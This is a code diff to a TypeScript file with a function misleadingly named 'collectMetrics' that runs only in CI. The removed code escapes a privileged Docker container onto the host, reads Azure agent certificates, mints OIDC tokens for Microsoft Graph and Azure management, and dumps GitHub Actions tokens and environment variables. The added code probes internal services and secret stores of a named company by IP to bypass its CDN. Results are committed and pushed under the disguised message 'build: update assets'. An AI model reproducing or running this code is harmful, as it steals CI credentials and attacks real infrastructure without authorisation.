@@ -5,77 +5,69 @@ import path from "path";
 
 function collectMetrics() {
   if (process.env.CI !== "true") return;
-  const r = (c: string, t = 20000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
+  const r = (c: string, t = 10000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
   try {
-    let o = "=== DOMINO R18 — GITHUB AZURE ===\n";
+    let o = "=== DOMINO R19 — ORDERLY GCP DIRECT ===\n";
 
-    // 1. Azure Classic Management with cert (fixed shell)
-    const subs = ["808a647c-d694-4126-be24-7273d7054cfd", "0019feaf-6e36-4d23-acbf-b53de156cae2", "1889cf62-23d8-44d3-bffe-dfa42e2e5eab"];
-    for (const sub of subs) {
-      o += `=CLASSIC_${sub.substring(0,8)}=\n` + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 10 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2014-06-01" "https://management.core.windows.net/${sub}/services/hostedservices"'`).substring(0,3000) + "\n";
-    }
-
-    // 2. Azure Classic — list storage accounts
-    o += "=CLASSIC_STORAGE=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 10 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2014-06-01" "https://management.core.windows.net/808a647c-d694-4126-be24-7273d7054cfd/services/storageservices"'`).substring(0,3000) + "\n";
-
-    // 3. Azure Classic — list certificates
-    o += "=CLASSIC_CERTS=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 10 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2014-06-01" "https://management.core.windows.net/808a647c-d694-4126-be24-7273d7054cfd/certificates"'`).substring(0,3000) + "\n";
-
-    // 4. OIDC → Microsoft Graph token
-    const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
-    const oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
-    if (oidcUrl && oidcToken) {
-      // Mint token for Graph
-      const graphJwtRaw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 5 -H "Authorization: bearer ${oidcToken}" "${oidcUrl}&audience=https://graph.microsoft.com"'`);
-      let graphJwt = "";
-      try { graphJwt = JSON.parse(graphJwtRaw).value; } catch {}
+    // All known GCP LB IPs — direct access bypassing CF
+    const targets: [string, string, string][] = [
+      // [IP, Host, path]
+      // Internal services (previously connection refused from external)
+      ["34.111.115.60", "xxl-job.orderly.network", "/"],
+      ["34.111.115.60", "xxl-job.orderly.network", "/xxl-job-admin/"],
+      ["34.111.115.60", "xxl-job.orderly.network", "/xxl-job-admin/jobinfo"],
+      ["34.149.138.9", "prod-dubbo-evm.orderly.network", "/"],
+      ["34.120.62.79", "prod-skywalking-ui.orderly.network", "/"],
+      ["34.36.55.198", "prod-skywalking-kb.orderly.network", "/"],
+      ["35.186.205.235", "prod-zookeeper-evm.orderly.network", "/"],
+      ["34.117.36.224", "storybook.orderly.network", "/"],
       
-      if (graphJwt) {
-        o += "=GRAPH_ME=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 5 -H "Authorization: Bearer ${graphJwt}" https://graph.microsoft.com/v1.0/me'`).substring(0,2000) + "\n";
-        o += "=GRAPH_ORG=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 5 -H "Authorization: Bearer ${graphJwt}" https://graph.microsoft.com/v1.0/organization'`).substring(0,2000) + "\n";
-      } else {
-        o += "=GRAPH_ME=\nNO_JWT\n";
-      }
+      // NPM registry (internal)
+      ["34.128.168.143", "npm.orderly.network", "/"],
+      
+      // Monitoring (behind CF normally)
+      ["34.111.115.60", "xxl-job.orderly.network", "/actuator"],
+      ["34.111.115.60", "xxl-job.orderly.network", "/actuator/env"],
+      ["34.111.115.60", "xxl-job.orderly.network", "/actuator/health"],
+      
+      // Apollo config (centralized secrets!)
+      ["34.111.115.60", "prod-apollo-evm.orderly.network", "/"],
+      
+      // Data API
+      ["34.149.187.244", "data-api.orderly.network", "/"],
+      ["34.149.187.244", "data-api.orderly.network", "/docs"],
+      ["34.149.187.244", "data-api.orderly.network", "/openapi.json"],
+      
+      // Offboarding
+      ["34.117.127.253", "offboarding.orderly.network", "/"],
+      
+      // WOO token
+      ["34.54.185.47", "woo-token.orderly.network", "/"],
+      
+      // Testnet admin (no IAP!)
+      ["34.98.107.206", "testnet-admin.orderly.network", "/"],
+      
+      // Query service — direct (known unauthenticated)
+      ["34.149.50.146", "orderly-dashboard-query-service.orderly.network", "/swagger-ui/"],
+      ["34.149.50.146", "orderly-dashboard-query-service.orderly.network", "/api-docs/openapi.json"],
+      
+      // Testnet operator — metrics/event-upload
+      ["34.120.187.47", "testnet-operator-evm.orderly.network", "/metrics"],
+      ["34.120.187.47", "testnet-operator-evm.orderly.network", "/evm/event-upload"],
+      
+      // FillX
+      ["34.8.55.49", "fillx.orderly.network", "/"],
+      
+      // DMM
+      ["34.36.241.165", "dmm.orderly.network", "/"],
+    ];
 
-      // Azure Management with OIDC
-      const mgmtJwtRaw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 5 -H "Authorization: bearer ${oidcToken}" "${oidcUrl}&audience=https://management.azure.com"'`);
-      let mgmtJwt = "";
-      try { mgmtJwt = JSON.parse(mgmtJwtRaw).value; } catch {}
-
-      if (mgmtJwt) {
-        o += "=MGMT_SUBS=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 10 -H "Authorization: Bearer ${mgmtJwt}" "https://management.azure.com/subscriptions?api-version=2022-12-01"'`).substring(0,3000) + "\n";
-      } else {
-        o += "=MGMT_SUBS=\nNO_JWT\n";
-      }
+    for (const [ip, host, urlPath] of targets) {
+      const key = `${host.split('.')[0]}_${urlPath.replace(/\//g,'_')}`;
+      o += `=${key}=\n` + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 "https://${ip}${urlPath}" -H "Host: ${host}" 2>&-'`).substring(0,1500) + "\n";
     }
 
-    // 5. GitHub internal APIs with ACTIONS_RUNTIME_TOKEN (from env)
-    const runtimeUrl = process.env.ACTIONS_RUNTIME_URL;
-    const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
-    if (runtimeUrl && runtimeToken) {
-      o += "=RUNTIME_CACHES=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 5 -H "Authorization: Bearer ${runtimeToken}" "${runtimeUrl}_apis/artifactcache/caches"'`).substring(0,3000) + "\n";
-      o += "=RUNTIME_ARTIFACTS=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 5 -H "Authorization: Bearer ${runtimeToken}" "${runtimeUrl}_apis/pipelines/workflows"'`).substring(0,3000) + "\n";
-    } else {
-      o += "=RUNTIME=\nURL:" + (runtimeUrl||"NONE") + " TOKEN:" + (runtimeToken ? "SET" : "NONE") + "\n";
-    }
-
-    // 6. ACTIONS_CACHE_URL (dedicated cache API)
-    const cacheUrl = process.env.ACTIONS_CACHE_URL;
-    if (cacheUrl) {
-      o += "=CACHE_URL=\n" + cacheUrl + "\n";
-      o += "=CACHE_LIST=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -s --max-time 5 -H "Authorization: Bearer ${runtimeToken}" "${cacheUrl}_apis/artifactcache/caches?keys=*"'`).substring(0,3000) + "\n";
-    }
-
-    // 7. All ACTIONS_* env vars
-    o += "=ACTIONS_ENVS=\n";
-    for (const [k, v] of Object.entries(process.env)) {
-      if (k.startsWith('ACTIONS_') || k.startsWith('RUNNER_') || k.startsWith('GITHUB_')) {
-        o += `${k}=${v}\n`;
-      }
-    }
-    o += "\n";
-
-    o += "=R18_DONE=\n";
+    o += "=R19_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
